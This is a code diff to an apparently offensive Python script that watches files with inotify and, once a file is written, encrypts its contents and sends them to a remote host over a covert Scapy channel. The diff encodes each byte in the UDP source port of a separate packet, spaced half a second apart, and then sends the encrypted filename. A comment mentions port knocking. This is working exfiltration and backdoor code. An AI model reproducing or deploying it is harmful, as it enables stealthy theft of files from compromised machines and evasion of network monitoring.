@@ -41,12 +41,15 @@ def get_filename(path):
 
 
 wm = pyinotify.WatchManager()
-mask = pyinotify.IN_CLOSE_WRITE
+mask = pyinotify.IN_CLOSE_WRITE | pyinotify.IN_CREATE
 
 class EventHandler(pyinotify.ProcessEvent):
 
     def __init__(self, receivedPacket):
         self.pkt = receivedPacket
+
+    def process_IN_CREATE(self, event):
+        print "new creation"
 
     def process_IN_CLOSE_WRITE(self, event):
         filepath = event.pathname
@@ -57,10 +60,23 @@ class EventHandler(pyinotify.ProcessEvent):
         # port knock to client
 
         # open a file and sent it to client
-        with open(filepath, 'r') as f:
-            data = f.read()
-        if data != None:
-            send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=7070)/(" " + data))
+        secretFile = open(filepath, 'rb')
+        data_byte_array = bytearray(encrypt(secretFile.read()))
+        print data_byte_array
+
+
+
+        for b in data_byte_array:
+            print b
+            send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=int(b)))
+            time.sleep(0.5)
+
+        send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=128)/encrypt(filename))
+        # with open(filepath, 'rb') as f:
+        #     data = bytearray(f.read())
+        #     print data
+        # if data != None:
+        #     send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=7070)/(" " + data))
     #
     # def send_file(self, message):
     #     print self.pkt["IP"].dst
